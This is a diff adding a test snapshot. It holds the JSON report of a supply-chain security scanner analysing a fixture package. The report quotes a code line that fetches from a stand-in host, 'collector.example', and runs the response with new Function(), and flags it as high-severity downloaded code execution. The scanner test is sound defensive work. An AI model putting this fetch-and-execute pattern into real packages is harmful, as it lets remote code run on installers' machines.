@@ -1,0 +1,120 @@
+---
+source: tests/workflows/tests/install_source_analysis.rs
+expression: envelope
+---
+{
+  "success": true,
+  "behavioral_coverage": {
+    "complete": true,
+    "scanned_packages": 1,
+    "partial_packages": 0,
+    "unavailable_packages": 0,
+    "packages": []
+  },
+  "manager": "lpm",
+  "degraded": false,
+  "osv_degraded": false,
+  "osv_degraded_reason": null,
+  "scanned": 1,
+  "checked_lpm": 0,
+  "packages_with_issues": 1,
+  "total_issues": 3,
+  "total_capabilities": 2,
+  "osv_vulnerabilities": 0,
+  "counts": {
+    "critical": 0,
+    "high": 1,
+    "moderate": 0,
+    "low": 0,
+    "info": 2
+  },
+  "packages": [
+    {
+      "name": "targeted-source-control",
+      "version": "1.0.0",
+      "instance_id": "[INSTANCE_ID]",
+      "path": "[PACKAGE_PATH]",
+      "quality_score": null,
+      "capabilities": [
+        {
+          "rule_id": "eval",
+          "name": "eval()",
+          "policy_severity": "high",
+          "source": "local",
+          "evidence": [
+            {
+              "ruleId": "eval",
+              "path": "index.js",
+              "line": 1,
+              "column": 78,
+              "excerpt": "n(){const response=await fetch('https://collector.example');new Function(await response.text())();}",
+              "reason": "Source pattern indicates a capability; execution is not established.",
+              "fileContext": "source"
+            }
+          ]
+        },
+        {
+          "rule_id": "network",
+          "name": "network access",
+          "policy_severity": "moderate",
+          "source": "local",
+          "evidence": [
+            {
+              "ruleId": "network",
+              "path": "index.js",
+              "line": 1,
+              "column": 43,
+              "excerpt": "async function run(){const response=await fetch('https://collector.example');new Function(await response.text())();}",
+              "reason": "Source pattern indicates a capability; execution is not established.",
+              "fileContext": "source"
+            }
+          ]
+        }
+      ],
+      "issues": [
+        {
+          "severity": "info",
+          "category": "supply-chain",
+          "message": "URL literals",
+          "source": "local",
+          "rule_id": "url-strings",
+          "evidence": [
+            {
+              "ruleId": "url-strings",
+              "path": "index.js",
+              "reason": "Source contains a URL literal.",
+              "fileContext": "source"
+            }
+          ]
+        },
+        {
+          "severity": "info",
+          "category": "supply-chain",
+          "message": "trivial package",
+          "source": "local",
+          "rule_id": "trivial",
+          "evidence": []
+        },
+        {
+          "severity": "high",
+          "category": "supply-chain",
+          "message": "downloaded code execution",
+          "source": "local",
+          "rule_id": "downloaded-execution",
+          "evidence": [
+            {
+              "ruleId": "downloaded-execution",
+              "path": "index.js",
+              "line": 1,
+              "column": 78,
+              "excerpt": "n(){const response=await fetch('https://collector.example');new Function(await response.text())();}",
+              "reason": "A downloaded response reaches code evaluation or a file passed to a process launcher.",
+              "fileContext": "source"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "vulnerabilities": []
+}
